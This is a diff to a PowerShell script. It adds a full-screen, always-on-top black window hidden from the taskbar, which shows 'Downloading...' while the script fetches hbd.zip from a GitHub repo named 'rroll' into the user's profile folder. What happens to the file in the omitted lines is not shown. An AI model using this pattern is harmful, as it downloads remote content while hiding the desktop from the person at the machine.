@@ -1,5 +1,35 @@
 
+Add-Type -AssemblyName PresentationFramework
+
+$window = New-Object Windows.Window
+$window.WindowStyle = "None"
+$window.WindowState = "Maximized"
+$window.Background = "Black"
+$window.Topmost = $true
+$window.ShowInTaskbar = $false
+
+$grid = New-Object Windows.Controls.Grid
+$label = New-Object Windows.Controls.TextBlock
+$label.Text = "Downloading..."
+$label.Foreground = "White"
+$label.FontSize = 28
+$label.HorizontalAlignment = "Center"
+$label.VerticalAlignment = "Center"
+
+$grid.Children.Add($label) | Out-Null
+$window.Content = $grid
+
+$window.Show()
+
+function Set-Stage($text) {
+    $window.Dispatcher.Invoke([action]{ $label.Text = $text })
+}
+
+
+
 cd $env:USERPROFILE
+
+Set-Stage "Downloading..."
 Invoke-WebRequest -Uri "https://github.com/Cancarutu2012/rroll/raw/refs/heads/main/hbd.zip" -OutFile "$env:USERPROFILE\hbd.zip"
 cd $env:USERPROFILE
 
@@ -54,7 +84,10 @@ catch {
     Write-Host $_.Exception.Message
 }
 
-Read-Host "FINISH"
-exit
+Set-Stage "Done"
+
+Start-Sleep 1
+
+$window.Dispatcher.Invoke([action]{ $window.Close() })
 
 
